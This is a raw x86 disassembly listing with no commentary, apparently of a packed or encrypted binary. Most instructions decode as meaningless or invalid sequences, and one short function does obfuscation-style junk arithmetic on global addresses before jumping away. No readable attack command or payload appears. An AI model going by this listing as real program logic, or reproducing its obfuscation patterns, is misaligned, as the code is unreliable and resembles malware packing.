  409504:	or     BYTE PTR [edi],bl
  409506:	int3   
  409507:	cmp    ax,0x676d
  40950b:	cld    
  40950c:	fst    QWORD PTR [eax-0x1d9484a1]
  409512:	pop    ecx
  409513:	or     eax,0xefdd59ff
  409518:	push   edx
  409519:	scas   eax,DWORD PTR es:[edi]
  40951a:	lahf   
  40951b:	sbb    edi,DWORD PTR [edx+0x4a]
  40951e:	hlt    
  40951f:	leave  
  409520:	mov    edx,0xf464491c
  409525:	push   cs
  409526:	jmp    0x2796:0x1ea1b344
  40952d:	push   eax
  40952e:	sub    eax,0x64e8bd8d
  409533:	sahf   
  409534:	enter  0xc7ff,0x8b
  409538:	call   0xd4a545b2
  40953d:	jno    0x40959a
  40953f:	retf   
  409540:	shr    BYTE PTR fs:[edi],cl
  409543:	loop   0x409590
  409545:	cmp    dl,bl
  409547:	push   0xfffffff7
  409549:	and    BYTE PTR [edi-0x62967e1c],dh
  40954f:	sub    dl,ah
  409551:	sbb    esi,DWORD PTR [esi]
  409553:	pop    esp
  409554:	dec    ebp
  409555:	jmp    0xd1ee85dd
  40955a:	ret    
  40955b:	sbb    eax,0x3555c391
  409560:	loop   0x40950c
  409562:	fwait
  409563:	mov    ah,0xfc
  409565:	xor    ebx,esp
  409567:	push   ebx
  409568:	ror    edi,0xae
  40956b:	push   ss
  40956c:	mov    cl,0x81
  40956e:	cmp    DWORD PTR [eax-0x6bcbad2f],edi
  409574:	jae    0x409595
  409576:	sbb    DWORD PTR [eax+0x47],edx
  409579:	cmp    DWORD PTR [esi-0x7f],ecx
  40957c:	rcl    DWORD PTR [eax+0x63],cl
  40957f:	sahf   
  409580:	sbb    al,0xb6
  409582:	sti    
  409583:	repnz sbb BYTE PTR [eax],ch
  409586:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409587:	aas    
  409588:	mov    cs,WORD PTR ds:0x61438d86
  40958e:	jns    0x409554
  409590:	out    0x88,al
  409592:	pusha  
  409593:	popf   
  409594:	xchg   ebx,eax
  409595:	loopne 0x409571
  409597:	sbb    DWORD PTR [esi+esi*2-0x80],esp
  40959b:	xor    al,0xed
  40959d:	data16 adc ch,cl
  4095a0:	cmp    DWORD PTR [edx-0x44],0x43
  4095a4:	sbb    eax,0x9173df89
  4095a9:	aaa    
  4095aa:	mov    cl,0x7d
  4095ac:	mov    cl,0x13
  4095ae:	jmp    0x4095bf
  4095b0:	cmp    eax,0xa2ebc343
  4095b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095b6:	dec    edi
  4095b7:	pop    esp
  4095b8:	(bad)  [eax-0x3b]
  4095bb:	loop   0x4095d4
  4095bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095be:	fldenv [ecx+edi*2+0x49]
  4095c2:	or     al,0x6b
  4095c4:	mov    ?,WORD PTR [ebp-0xb691714]
  4095ca:	das    
  4095cb:	lods   eax,DWORD PTR ds:[esi]
  4095cc:	in     eax,dx
  4095cd:	mov    eax,ds:0xfac29fc7
  4095d2:	ss and ecx,esi
  4095d5:	loopne 0x409627
  4095d7:	sub    al,0xcc
  4095d9:	mov    al,cs:0xeda33a9c
  4095df:	popf   
  4095e0:	and    bh,BYTE PTR [edx-0x22]
  4095e3:	(bad)  
  4095e4:	ss jae 0x409642
  4095e7:	inc    edx
  4095e8:	jae    0x409577
  4095ea:	call   0x406b0f
  4095ef:	jmp    0x409836
  4095f4:	loope  0x40958c
  4095f6:	jmp    0x3d73:0xf1606904
  4095fd:	clc    
  4095fe:	jmp    0x8ed7:0x55aed24e
  409605:	fstp   TBYTE PTR [esi+0x7e]
  409608:	and    al,0x7c
  40960a:	jle    0x40968a
  40960c:	inc    ebx
  40960d:	scas   eax,DWORD PTR es:[edi]
  40960e:	lea    esp,[edx]
  409610:	mov    ch,0xdc
  409612:	pop    ebp
  409613:	je     0x4095c2
  409615:	lods   eax,DWORD PTR ds:[esi]
  409616:	cmp    al,0xf7
  409618:	aaa    
  409619:	push   es
  40961a:	les    ebp,FWORD PTR [eax]
  40961c:	cwde   
  40961d:	int    0xd4
  40961f:	mov    ds:0x161a54a1,eax
  409624:	fsubr  st(7),st
  409626:	js     0x409675
  409628:	or     dh,ch
  40962a:	xchg   esi,eax
  40962b:	add    eax,eax
  40962d:	scas   al,BYTE PTR es:[edi]
  40962e:	xchg   DWORD PTR [esi-0x28],edi
  409631:	jp     0x40967a
  409633:	dec    esi
  409634:	mov    bl,0x6
  409636:	mov    bh,0x2
  409638:	inc    esi
  409639:	and    edx,edx
  40963b:	or     DWORD PTR [edi+0x27],ebp
  40963e:	les    ebp,FWORD PTR [ecx-0x1ca21885]
  409644:	add    eax,0xebc0a9df
  409649:	lods   al,BYTE PTR ds:[esi]
  40964a:	repz (bad) 
  40964d:	loopne 0x40964b
  40964f:	sub    dl,bl
  409651:	sti    
  409652:	icebp  
  409653:	fidivr DWORD PTR [esi-0x5a8eee0d]
  409659:	enter  0xfc88,0x53
  40965d:	adc    al,0x56
  40965f:	jno    0x409626
  409661:	xchg   DWORD PTR [esi],eax
  409663:	mov    eax,ds:0x155ad1a7
  409668:	cli    
  409669:	hlt    
  40966a:	pusha  
  40966b:	popf   
  40966c:	fadd   st(2),st
  40966e:	add    edi,DWORD PTR [edx+0x45f901a6]
  409674:	pop    esi
  409675:	dec    ebp
  409676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409677:	add    cl,ah
  409679:	shl    DWORD PTR [esi+0x1761cb1],cl
  40967f:	stc    
  409680:	imul   esi,DWORD PTR [edx+0x15],0x350dad69
  409687:	(bad)  
  409688:	enter  0xdb57,0xd0
  40968c:	pushf  
  40968d:	outs   dx,BYTE PTR ds:[esi]
  40968e:	mov    al,0xc9
  409691:	sbb    al,0x7
  409693:	dec    edx
  409694:	(bad)  
  409695:	xor    BYTE PTR [edi+0xe],cl
  409698:	add    DWORD PTR [ebx+0x3d6087b6],edx
  40969e:	fild   DWORD PTR [edi-0x45]
  4096a1:	jne    0x7a412676
  4096a7:	sub    eax,0x52bb5151
  4096ac:	pop    ebp
  4096ad:	sahf   
  4096ae:	call   0x3d5f2987
  4096b3:	fwait
  4096b4:	out    dx,al
  4096b5:	aam    0x81
  4096b7:	xor    ecx,DWORD PTR [edx+0x76]
  4096ba:	pop    eax
  4096bb:	(bad)  
  4096bc:	inc    edx
  4096bd:	jg     0x4096dd
  4096bf:	mov    edi,0x7031c8b3
  4096c4:	cmp    BYTE PTR [ebp+0x4],0xcf
  4096c8:	or     dl,BYTE PTR [ebx-0x7c]
  4096cb:	(bad)  
  4096cc:	outs   dx,BYTE PTR ds:[esi]
  4096cd:	imul   ebx,DWORD PTR [ebx-0x746c77f5],0x5ef4eb03
  4096d7:	outs   dx,BYTE PTR ds:[esi]
  4096d8:	and    al,0xd7
  4096da:	push   es
  4096db:	push   ecx
  4096dc:	aad    0xa2
  4096de:	iret   
  4096df:	sti    
  4096e0:	inc    ecx
  4096e1:	fcomp  QWORD PTR [esi-0x5c]
  4096e4:	xor    eax,DWORD PTR [ebx+0x46]
  4096e7:	outs   dx,DWORD PTR ds:[esi]
  4096e8:	mov    cl,0x62
  4096ea:	fild   WORD PTR [eax+0x2d9ce019]
  4096f0:	popf   
  4096f1:	mov    ds:0xf7792ac7,eax
  4096f6:	(bad)  
  4096f7:	cmc    
  4096f8:	push   ds
  4096f9:	lods   al,BYTE PTR ds:[esi]
  4096fa:	fs pop edx
  4096fc:	mov    ecx,0xa9877aad
  409701:	je     0x409744
  409703:	cli    
  409704:	add    eax,0x7c53df41
  409709:	push   es
  40970a:	loop   0x409723
  40970c:	lods   eax,DWORD PTR ds:[esi]
  40970d:	call   0xe84d:0x8fa29fd2
  409714:	mov    ebx,0x3e23ee28
  409719:	mov    ebx,0x107b6c8c
  40971e:	add    al,0x38
  409720:	into   
  409721:	lds    eax,FWORD PTR [ebx+0x49f3186e]
  409727:	sub    BYTE PTR [ebx],ch
  409729:	fist   DWORD PTR [edx-0x4970f012]
  40972f:	arpl   WORD PTR [ebx+0x2bf4466f],bx
  409735:	push   edi
  409736:	inc    ecx
  409737:	xchg   ecx,eax
  409738:	mov    eax,0xf0d90322
  40973d:	pop    eax
  40973e:	retf   
  40973f:	(bad)
  409743:	jecxz  0x40973c
  409745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409746:	pop    esi
  409747:	sbb    DWORD PTR [edx-0x57],edx
  40974a:	scas   al,BYTE PTR es:[edi]
  40974b:	pop    ss
  40974c:	stos   BYTE PTR es:[edi],al
  40974d:	ins    DWORD PTR es:[edi],dx
  40974e:	retf   
  40974f:	sahf   
  409750:	imul   edx,edx,0x7a
  409753:	jl     0x409795
  409755:	mov    cl,0xbe
  409757:	int    0xf1
  409759:	inc    esp
  40975a:	adc    DWORD PTR [ecx-0x77605a5c],ecx
  409760:	fadd   DWORD PTR [ebx-0x6d]
  409763:	adc    DWORD PTR [ecx-0x6e],edx
  409766:	stos   DWORD PTR es:[edi],eax
  409767:	pop    esp
  409768:	popf   
  409769:	push   es
  40976a:	jno    0x409718
  40976c:	or     eax,0x85962371
  409771:	mov    esi,0xc01eb416
  409776:	stos   BYTE PTR es:[edi],al
  409777:	jge    0x40979c
  409779:	popa   
  40977a:	enter  0x66d2,0x62
  40977e:	outs   dx,DWORD PTR ds:[esi]
  40977f:	aam    0x13
  409781:	add    eax,0x32acd070
  409786:	cmp    eax,0xa99479e3
  40978b:	sbb    eax,0xb3171af0
  409790:	jl     0x409741
  409792:	imul   ebp,esi,0xffffffd2
  409795:	nop
  409796:	int3   
  409797:	out    dx,eax
  409798:	rol    cl,1
  40979a:	test   BYTE PTR [edx-0x47],al
  40979d:	iret   
  40979e:	inc    edi
  40979f:	xchg   edi,eax
  4097a0:	add    bh,bl
  4097a2:	sbb    DWORD PTR [edx],edx
  4097a4:	js     0x40981e
  4097a6:	int    0xd0
  4097a8:	xchg   edx,eax
  4097a9:	fcom   DWORD PTR [esi+eax*2]
  4097ac:	fldenv [edx]
  4097ae:	bswap  ebp
  4097b0:	(bad)  
  4097b1:	sbb    bh,BYTE PTR [ebx]
  4097b3:	popa   
  4097b4:	inc    esi
  4097b5:	mov    esi,0x6a11731e
  4097ba:	in     eax,dx
  4097bb:	fistp  DWORD PTR [edi-0x4bbbeef3]
  4097c1:	(bad)  
  4097c2:	sbb    al,0xa6
  4097c4:	daa    
  4097c5:	mov    bh,BYTE PTR [eax+0x66]
  4097c8:	paddusw mm7,QWORD PTR [ebp+edi*8+0x4f]
  4097cd:	out    0x42,eax
  4097cf:	dec    edx
  4097d0:	push   ebp
  4097d1:	xor    edx,esp
  4097d3:	jo     0x409797
  4097d5:	sub    bh,BYTE PTR [edi+0x1a6d2db]
  4097db:	arpl   WORD PTR [ebp+0x7a],si
  4097de:	sti    
  4097df:	les    edx,FWORD PTR [edx]
  4097e1:	sub    DWORD PTR [ebp+0x3d53909f],esi
  4097e7:	mov    edi,0x7af41f64
  4097ec:	cli    
  4097ed:	xlat   BYTE PTR ds:[ebx]
  4097ee:	in     eax,dx
  4097ef:	sbb    al,0x49
  4097f1:	pop    ds
  4097f2:	mov    bl,0xf4
  4097f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097f5:	mov    eax,0x5926fddf
  4097fa:	fdivr  QWORD PTR [ecx]
  4097fc:	outs   dx,BYTE PTR ds:[esi]
  4097fd:	xchg   esi,eax
  4097fe:	mov    ds:0x9ec61ff8,al
  409803:	pop    ebx
  409804:	cli    
  409805:	dec    ebp
  409806:	cmp    BYTE PTR [edi+0x1c],bl
  409809:	pop    es
  40980a:	ss ret 0xc817
  40980e:	jmp    0x409836
  409810:	(bad)  
  409811:	enter  0x5031,0xfa
  409815:	(bad)  
  409816:	aad    0xd5
  409818:	push   eax
  409819:	pushf  
  40981a:	or     ebp,DWORD PTR [edx-0x3b]
  40981d:	imul   ebp,DWORD PTR [edx],0xffffff99
  409820:	test   al,0xcd
  409822:	fstp   st(5)
  409824:	(bad)  
  409825:	retf   
  409826:	test   DWORD PTR [ebp+0x21],esi
  409829:	dec    esi
  40982a:	add    ecx,esp
  40982c:	or     dl,bl
  40982e:	jns    0x4097ed
  409830:	aas    
  409831:	in     eax,dx
  409832:	pop    eax
  409833:	push   cs
  409834:	outs   dx,DWORD PTR ds:[esi]
  409835:	pop    ebx
  409836:	mov    eax,DWORD PTR [ebp-0xc]
  409839:	cmp    eax,ebx
  40983b:	je     0x40892f
  409841:	mov    eax,DWORD PTR [ebp-0x8]
  409844:	mov    eax,DWORD PTR [eax]
  409846:	pop    edi
  409847:	pop    esi
  409848:	pop    ebx
  409849:	leave  
  40984a:	ret    0xc
  40984d:	push   ebp
  40984e:	mov    ebp,esp
  409850:	sub    esp,0x30
  409853:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40985a:	add    ecx,0x13ba
  409860:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409867:	xor    ecx,ecx
  409869:	xor    ecx,DWORD PTR ds:0x43375f
  40986f:	xor    DWORD PTR ds:0x433697,ecx
  409875:	mov    ecx,DWORD PTR [ebp-0x4]
  409878:	push   ebx
  409879:	sub    eax,eax
  40987b:	mov    eax,0x7510854
  409880:	add    DWORD PTR ds:0x43375b,0x43372b
  40988a:	xor    ecx,eax
  40988c:	mov    ebx,0x32729b
  409891:	add    ecx,ebx
  409893:	or     DWORD PTR ds:0x4336e7,0x433793
  40989d:	mov    DWORD PTR [ebp-0x1c],ecx
  4098a0:	mov    ecx,DWORD PTR ds:0x43367b
  4098a6:	sub    DWORD PTR ds:0x43375f,ecx
  4098ac:	mov    ecx,DWORD PTR [ebp+0x14]
  4098af:	jmp    0x409b12
  4098b4:	shr    DWORD PTR [ebx+0x7570c4c2],0xc1
  4098bb:	stos   DWORD PTR es:[edi],eax
  4098bc:	fadd   st(6),st
  4098be:	cwde   
  4098bf:	pushf  
  4098c0:	out    0x85,al
  4098c2:	nop
  4098c3:	add    al,0xb4
  4098c5:	fnstcw WORD PTR [esi+0x7e]
  4098c8:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  4098cc:	aam    0x11
  4098ce:	push   0x80104398
  4098d3:	lods   al,BYTE PTR ds:[esi]
  4098d4:	(bad)  
  4098d5:	fst    QWORD PTR [esi+0x56d22f6d]
  4098db:	pop    ebp
  4098dc:	jb     0x4098df
  4098de:	mov    edx,0x5be5c15c
  4098e3:	bound  eax,QWORD PTR [esi-0x3e457c12]
  4098e9:	add    DWORD PTR [edx+0x84537df],edx
  4098ef:	mov    DWORD PTR [edi],ebp
  4098f1:	stos   BYTE PTR es:[edi],al
  4098f2:	sub    BYTE PTR ds:0x187714b6,ah
  4098f8:	sub    ebp,DWORD PTR [bp-0x30cf]
  4098fd:	scas   al,BYTE PTR es:[edi]
  4098fe:	(bad)  
  4098ff:	mov    al,ds:0x7dfb903a
  409904:	fsubrp st(4),st
  409906:	lods   al,BYTE PTR ds:[esi]
  409907:	cmp    ah,bl
  409909:	xchg   ecx,eax
  40990a:	pop    edx
  40990b:	test   eax,0x7c19d04
  409910:	in     al,dx
  409911:	mov    al,0xa2
  409913:	mov    eax,ss:0xd441e66
  409919:	sbb    al,0x4e
  40991b:	xchg   DWORD PTR [esi+0x6f],eax
  40991e:	das    
  40991f:	mov    gs,WORD PTR [esi]
  409921:	mov    al,ds:0x86e30ee0
  409926:	xor    eax,0x6bab258d
  40992b:	jg     0x409996
  40992d:	mov    al,ds:0x894eedef
  409932:	inc    ebp
  409933:	jmp    0x4098c0
  409935:	pop    es
  409936:	add    BYTE PTR [ecx-0x4],cl
  409939:	clc    
  40993a:	scas   eax,DWORD PTR es:[edi]
  40993b:	and    ah,ah
  40993d:	inc    edi
  40993e:	pop    ebp
  40993f:	retf   
  409940:	mov    edi,0xc50ca0af
  409945:	jmp    0x8e04:0x42670130
  40994c:	mov    ch,0x84
  40994e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40994f:	push   ds
  409950:	mov    bl,0xf9
  409952:	leave  
  409953:	adc    eax,0x34f29195
  409958:	pop    ss
  409959:	scas   eax,DWORD PTR es:[edi]
  40995a:	pop    esp
  40995b:	rol    ebx,cl
  40995d:	scas   al,BYTE PTR es:[edi]
  40995e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40995f:	sbb    al,0x4d
  409961:	jg     0x40996e
  409963:	sbb    al,dh
  409965:	sub    al,0x18
  409967:	mov    ah,0xc8
  409969:	cdq    
  40996a:	push   esp
  40996b:	stos   DWORD PTR es:[edi],eax
  40996c:	icebp  
  40996d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40996e:	push   ss
  40996f:	sub    cl,BYTE PTR [edx]
  409971:	cmp    DWORD PTR [esi],esp
  409973:	repz push ss
  409975:	shr    BYTE PTR [eax],cl
  409977:	hlt    
  409978:	and    cl,ch
  40997a:	sbb    ebx,eax
  40997c:	popa   
  40997d:	mov    cl,0x18
  40997f:	rol    DWORD PTR [ecx-0x17],1
  409982:	xor    al,0x9f
  409984:	hlt    
  409985:	ret    0x3ce6
  409988:	(bad)  
  409989:	les    ebp,FWORD PTR [esi+eax*2-0x4fe3762a]
  409990:	sbb    bl,al
  409992:	dec    ecx
  409993:	xchg   ebp,eax
  409994:	cmp    al,BYTE PTR [ebx]
  409996:	ror    DWORD PTR ds:0x12c3bfd9,1
  40999c:	loopne 0x409925
  40999e:	pop    ebx
  40999f:	sahf   
  4099a0:	dec    edi
  4099a1:	call   0x8b8f:0x92ca4ead
  4099a8:	add    DWORD PTR [ecx-0xb],ecx
  4099ab:	jb     0xa6569a3e
  4099b1:	aas    
  4099b2:	in     eax,dx
  4099b3:	nop
  4099b4:	or     al,0xc8
  4099b6:	fs xchg edi,eax
  4099b8:	in     al,0x5f
  4099ba:	jno    0x409a11
  4099bc:	and    al,0x22
  4099be:	xchg   ecx,eax
  4099bf:	push   0xb7211473
  4099c4:	data16 int 0x5a
  4099c7:	sti    
  4099c8:	not    ah
  4099ca:	fld    st(3)
  4099cc:	pop    eax
  4099cd:	in     al,0xee
  4099cf:	sub    DWORD PTR [esi+esi*8-0x4a9cd14a],edi
  4099d6:	addr16 into 
  4099d8:	ins    DWORD PTR es:[edi],dx
  4099d9:	xchg   edi,eax
  4099da:	dec    esp
  4099db:	pop    ss
  4099dc:	(bad)  
  4099dd:	lods   eax,DWORD PTR ds:[esi]
  4099de:	sbb    bh,BYTE PTR ds:0xeed43803
  4099e4:	scas   al,BYTE PTR es:[edi]
  4099e5:	sbb    edx,DWORD PTR [ebx+0x5fb57d31]
  4099eb:	mov    dl,BYTE PTR [eax-0x5c545c58]
  4099f1:	fucomp st(7)
  4099f3:	mov    ds:0x65065bad,eax
  4099f8:	les    ebx,FWORD PTR [edi-0xb]
  4099fb:	and    eax,0x2a1a3cb8
  409a00:	cmp    al,0xbe
  409a02:	add    al,0xea
  409a04:	test   eax,0x5c608481
  409a09:	dec    eax
  409a0a:	pop    esi
  409a0b:	mov    ah,0x11
  409a0d:	jb     0x4099a4
  409a0f:	dec    ebp
  409a10:	jle    0x409a59
  409a12:	xchg   edx,eax
  409a13:	je     0x4099d5
  409a15:	outs   dx,DWORD PTR ds:[esi]
  409a16:	and    al,0xbf
  409a18:	ret    0xb0fa
  409a1b:	sub    DWORD PTR [edi-0x7a],ebx
  409a1e:	loop   0x4099a6
  409a20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a21:	aas    
  409a22:	outs   dx,DWORD PTR ds:[esi]
  409a23:	sbb    BYTE PTR [esp+ebp*4-0x7ebf7533],0xee
  409a2b:	mov    esp,0x876fc988
  409a30:	ds cmp edx,0xc2b55a1c
  409a37:	retf   0x5ce4
  409a3a:	add    eax,0xd361f35
  409a3f:	ss out 0xb6,eax
  409a42:	dec    eax
  409a43:	pop    ss
  409a44:	loop   0x409a67
  409a46:	sbb    DWORD PTR [edx-0x4d1cc957],edx
  409a4c:	les    esp,FWORD PTR ds:0x4b523600
  409a52:	cdq    
  409a53:	pop    esi
  409a54:	adc    bh,BYTE PTR [ebp-0x70]
  409a57:	fisubr WORD PTR [esp+eax*4-0x73175f39]
  409a5e:	xchg   ecx,eax
  409a5f:	pop    es
  409a60:	(bad)  
  409a61:	mov    BYTE PTR [ebp+0x1d],0xd6
  409a65:	test   al,0xb6
  409a67:	fxch   st(7)
  409a69:	add    eax,0xe56d11a6
  409a6e:	inc    edi
  409a6f:	mov    al,0xd8
  409a71:	mov    esp,0x43d3e8ba
  409a76:	jl     0x409a8d
  409a78:	cmp    eax,0xaad28004
  409a7d:	add    edx,ebx
  409a7f:	mov    edx,0xfc29a72c
  409a84:	test   edi,eax
  409a86:	dec    ecx
  409a87:	dec    esp
  409a88:	mov    ebp,0x9dc4246
  409a8d:	aaa    
  409a8e:	or     eax,0xa9713c1b
  409a93:	mov    bh,0x80
  409a95:	inc    sp
  409a97:	aad    0x6a
  409a99:	in     al,dx
  409a9a:	mov    ds:0x364ef071,eax
  409a9f:	and    al,0x2d
  409aa1:	inc    ebp
  409aa2:	ins    DWORD PTR es:[edi],dx
  409aa3:	mov    cl,0xa5
  409aa5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aa6:	and    al,0x11
  409aa8:	jecxz  0x409a55
  409aaa:	dec    esp
  409aab:	out    dx,al
  409aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aad:	add    edi,DWORD PTR [eax]
  409aaf:	leave  
  409ab0:	cli    
  409ab1:	and    eax,0xe9c5a390
  409ab6:	dec    eax
  409ab7:	add    eax,0x19e4967f
  409abc:	ret    
  409abd:	pop    edi
  409abe:	(bad)  
  409abf:	xchg   edx,eax
  409ac0:	rcl    BYTE PTR [eax],1
  409ac2:	out    dx,eax
  409ac3:	sub    eax,0xe700df60
  409ac8:	je     0x409a9c
  409aca:	jae    0x409a98
  409acc:	int3   
  409acd:	jecxz  0x409b03
  409acf:	and    dl,BYTE PTR [ecx+0x10]
  409ad2:	cmp    al,0x71
  409ad4:	shl    BYTE PTR [ebx+0x1aec6421],cl
  409ada:	enter  0xa8e,0x8a
  409ade:	cwde   
  409adf:	ins    DWORD PTR es:[edi],dx
  409ae0:	xchg   edi,eax
  409ae1:	adc    DWORD PTR [esi+0x5f],esp
  409ae4:	test   bl,al
  409ae6:	xchg   ebx,eax
  409ae7:	out    dx,al
  409ae8:	xor    al,0x8
  409aea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409aeb:	out    dx,al
  409aec:	push   0xffffffb2
  409aee:	mov    ecx,0x738a97e2
  409af3:	js     0x409b1b
  409af5:	pop    edi
  409af6:	iret   
  409af7:	repnz push esi
  409af9:	fdivr  QWORD PTR [eax]
  409afb:	scas   al,BYTE PTR es:[edi]
  409afc:	push   edx
  409afd:	mov    esi,0xdca121e5
  409b02:	or     ch,BYTE PTR [edx+0x75476e37]
  409b08:	jo     0x409b38
  409b0a:	add    eax,0x168b0fea
  409b0f:	stos   BYTE PTR es:[edi],al
  409b10:	xchg   ebp,eax
  409b11:	rcl    BYTE PTR [esi+0x57],0x81
  409b15:	sbb    eax,0x43371f
  409b1a:	shl    DWORD PTR [esi],cl
  409b1c:	inc    ebx
  409b1d:	add    cl,ch
  409b1f:	pop    esi
  409b20:	add    al,BYTE PTR [eax]
  409b22:	add    ch,al
  409b24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b25:	lods   al,BYTE PTR ds:[esi]
  409b26:	shr    BYTE PTR [ecx+edx*8+0x61],cl
  409b2a:	mov    cl,0x92
  409b2c:	fisttp QWORD PTR [edi+0x1f1e16d4]
  409b32:	enter  0xe47e,0x7e
  409b36:	jle    0x409b70
  409b38:	jl     0x409bb8
  409b3a:	jle    0x409b4a
  409b3c:	stos   BYTE PTR es:[edi],al
  409b3d:	dec    edx
  409b3e:	mov    DWORD PTR [esi+0x34],edx
  409b41:	popa   
  409b42:	inc    ebx
  409b43:	xlat   BYTE PTR ds:[ebx]
  409b44:	mov    al,0x65
  409b46:	push   ss
  409b47:	mov    ch,0xa4
  409b49:	out    0x73,al
  409b4b:	mov    ecx,0x9d097808
  409b50:	cwde   
  409b51:	(bad)  
  409b52:	cmp    esp,DWORD PTR [ecx+0x374c85d2]
  409b58:	cmp    al,0xd6
  409b5a:	push   ebp
  409b5b:	inc    esp
  409b5c:	fs mov ah,0x52
  409b5f:	jge    0x409b3d
  409b61:	shl    BYTE PTR ds:0xd4fc3418,1
  409b67:	mov    eax,0x346ac336
  409b6c:	push   cs
  409b6d:	fild   WORD PTR [edx]
  409b6f:	sub    esp,DWORD PTR [eax+0x22]
  409b72:	xchg   BYTE PTR [esi],dl
  409b74:	cmp    BYTE PTR [edi+0x1ad87ab2],0x27
  409b7b:	adc    BYTE PTR [ecx],dh
  409b7d:	repz sti 
  409b7f:	dec    esi
  409b80:	add    BYTE PTR [edi],cl
  409b82:	outs   dx,DWORD PTR ds:[esi]
  409b83:	xchg   esi,eax
  409b84:	add    al,0x32
  409b86:	rcl    DWORD PTR [edi],1
  409b88:	clc    
  409b89:	in     al,0xf1
  409b8b:	adc    dh,al
  409b8d:	mov    WORD PTR [eax-0x2a],?
  409b90:	jnp    0x409b8d
  409b92:	(bad)
  409b95:	inc    ebp
  409b96:	call   0x44be8816
  409b9b:	test   al,0xb3
  409b9d:	ret    0x1bcf
  409ba0:	imul   ebp,DWORD PTR [ebx+0x3f],0x5908564d
  409ba7:	aam    0xb2
  409ba9:	out    dx,eax
  409baa:	and    DWORD PTR [eax-0x70],edx
  409bad:	loope  0x409bf2
  409baf:	adc    BYTE PTR [eax-0x3b],ch
  409bb2:	sbb    dl,BYTE PTR ds:0x7c78a138
  409bb8:	add    DWORD PTR [edi],esp
  409bba:	or     al,0x6a
  409bbc:	xor    eax,ebx
  409bbe:	jge    0x409b50
  409bc0:	frstor [esi]
  409bc2:	cmp    esp,DWORD PTR [ebp+edi*8-0x1d]
  409bc6:	sbb    eax,0x95d170b0
  409bcb:	dec    esi
  409bcc:	sahf   
  409bcd:	or     BYTE PTR [edi+ebx*2],dh
  409bd0:	shl    DWORD PTR [edx],1
  409bd2:	mov    edi,0x8dc8de0e
  409bd7:	fild   WORD PTR [ecx+0x5c]
  409bda:	bound  ebp,QWORD PTR [ebp+0x1b]
  409bdd:	cmp    BYTE PTR [edx-0x8],ch
  409be0:	mov    ds:0x286b638e,al
  409be5:	cld    
  409be6:	and    al,0x57
  409be8:	outs   dx,DWORD PTR ds:[esi]
  409be9:	xor    bh,BYTE PTR [ebx+0x2a3217f]
  409bef:	das    
  409bf0:	out    dx,al
  409bf1:	sub    DWORD PTR [eax+0x5c],eax
  409bf4:	or     bl,BYTE PTR [ebx-0x6aeff9d7]
  409bfa:	jecxz  0x409bb2
  409bfc:	mov    BYTE PTR [edx+0x27],ah
  409bff:	sub    dh,BYTE PTR [ecx]
  409c01:	repz mov esp,ebp
  409c04:	ins    BYTE PTR es:[edi],dx
  409c05:	dec    ebp
  409c06:	push   es
  409c07:	das    
  409c08:	fmul   QWORD PTR [esp+eiz*2+0x226b600c]
  409c0f:	dec    esp
  409c10:	jne    0x409c03
  409c12:	and    ebx,DWORD PTR [esi]
  409c14:	pop    edx
  409c15:	adc    al,0x6c
  409c17:	add    eax,0x2640ec9e
  409c1c:	sbb    eax,DWORD PTR [edi+0x2e]
  409c1f:	xchg   esp,eax
  409c20:	add    DWORD PTR [eax-0x72b829c0],ebp
  409c26:	ins    BYTE PTR es:[edi],dx
  409c27:	jns    0x409c57
  409c29:	xchg   ebx,eax
  409c2a:	pop    ss
  409c2b:	fisub  DWORD PTR [ecx+0x5bf86c9]
  409c31:	mov    ebp,0x841e1c24
  409c36:	pop    esp
  409c37:	cs (bad) 
  409c39:	repnz dec esp
  409c3b:	pusha  
  409c3c:	(bad)  
  409c3d:	cld    
  409c3e:	imul   eax,DWORD PTR [esi+0x75],0xffffffe4
  409c42:	test   ebx,eax
  409c44:	cmp    al,0x49
  409c46:	xor    eax,0x968f3556
  409c4b:	lods   al,BYTE PTR ds:[esi]
  409c4c:	clc    
  409c4d:	daa    
  409c4e:	add    edi,ebx
  409c50:	fwait
  409c51:	add    esp,esi
  409c53:	mov    esi,0x6e354b10
  409c58:	loopne 0x409bee
  409c5a:	in     al,dx
  409c5b:	sbb    DWORD PTR [edi-0x7b6e2a1],esp
  409c61:	mov    ebp,0x5b1f6901
  409c66:	sbb    BYTE PTR [ebx-0x4c],dh
  409c69:	pusha  
  409c6a:	ja     0x409c1e
  409c6c:	call   0xe3bcaaf6
  409c71:	push   ebp
  409c72:	or     BYTE PTR [edx-0x1fd5c31b],bl
  409c78:	mov    esp,0xcd68ae57
  409c7d:	jecxz  0x409c99
  409c7f:	mov    esi,0x46c47e35
  409c84:	clc    
  409c85:	mov    bl,0xe7
  409c87:	xor    DWORD PTR [ebp-0x52],ebp
  409c8a:	xchg   esi,eax
  409c8b:	sub    al,0x46
  409c8d:	pop    edx
  409c8e:	int3   
  409c8f:	rcr    BYTE PTR [ecx-0x25],0x7b
  409c93:	stc    
  409c94:	out    dx,eax
  409c95:	loopne 0x409c29
  409c97:	xchg   esi,eax
  409c98:	into   
  409c99:	ins    BYTE PTR es:[edi],dx
  409c9a:	inc    ebx
  409c9b:	mov    ah,0x7f
  409c9d:	cld    
  409c9e:	push   edx
  409c9f:	lea    edx,[edi+0x4f]
  409ca2:	outs   dx,BYTE PTR ds:[esi]
  409ca3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ca4:	into   
  409ca5:	or     bh,dh
  409ca7:	call   0x6a369b03
  409cac:	cdq    
  409cad:	jecxz  0x409c68
  409caf:	pop    esp
